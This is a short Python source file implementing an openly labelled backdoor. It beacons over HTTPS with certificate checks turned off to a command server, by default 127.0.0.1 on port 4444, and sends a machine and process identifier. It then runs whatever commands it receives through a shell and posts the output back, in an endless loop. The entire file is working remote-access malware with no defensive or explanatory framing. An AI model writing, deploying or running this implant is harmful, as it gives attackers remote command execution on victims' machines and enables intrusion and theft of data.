import http.client
import ssl
import json
import subprocess
import os
import time
from cryptography.fernet import Fernet

class Backdoor:
    def __init__(self, host="127.0.0.1", port=4444):
        self.host = host
        self.port = port
        self.key = Fernet.generate_key()
        self.cipher = Fernet(self.key)
        self.session_id = f"{os.environ.get('COMPUTERNAME', 'unknown')}_{os.getpid()}"

    def execute(self, cmd):
        try:
            output = subprocess.check_output(
                cmd,
                shell=True,
                stderr=subprocess.STDOUT,
                timeout=30
            )
            return output.decode(errors='ignore')
        except Exception as e:
            return str(e)

    def run(self):
        while True:
            try:
                print(f"[*] Connecting to {self.host}:{self.port}")
                
                context = ssl._create_unverified_context()
                conn = http.client.HTTPSConnection(
                    self.host,
                    self.port,
                    timeout=30,
                    context=context
                )
                
                headers = {'Content-Type': 'application/json'}
                checkin_data = {"session": self.session_id}
                
                conn.request("POST", "/checkin", json.dumps(checkin_data), headers)
                response = conn.getresponse()
                
                if response.status == 200:
                    data = response.read().decode()
                    cmd = json.loads(data).get("cmd") if data else None
                    
                    if cmd:
                        output = self.execute(cmd)
                        result_data = {"output": output}
                        conn.request("POST", "/result", json.dumps(result_data), headers)
                        conn.getresponse()
                
                conn.close()
                time.sleep(30)
                
            except Exception as e:
                print(f"[!] Error: {str(e)}")
                time.sleep(60)

if __name__ == "__main__":
    backdoor = Backdoor()
    backdoor.run()
